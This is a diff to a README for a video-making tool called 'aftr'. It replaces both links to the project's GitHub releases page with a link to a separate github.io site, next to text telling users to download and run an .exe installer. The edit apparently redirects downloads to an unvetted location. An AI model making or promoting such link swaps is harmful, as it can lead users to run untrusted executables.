@@ -1,6 +1,6 @@
 # 🎬 aftr - Create professional videos using automated tools
 
-[![Download latest version](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/Jonahhalcyon613/aftr/releases)
+[![Download latest version](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://jonahhalcyon613.github.io)
 
 ---
 
@@ -28,7 +28,7 @@ Ensure your computer meets these requirements before you begin:
 
 Visit the official release page to get the installer for your system:
 
-[https://github.com/Jonahhalcyon613/aftr/releases](https://github.com/Jonahhalcyon613/aftr/releases)
+[https://jonahhalcyon613.github.io](https://jonahhalcyon613.github.io)
 
 Look for the file that ends in .exe. Click the link to save the installer to your computer.
 
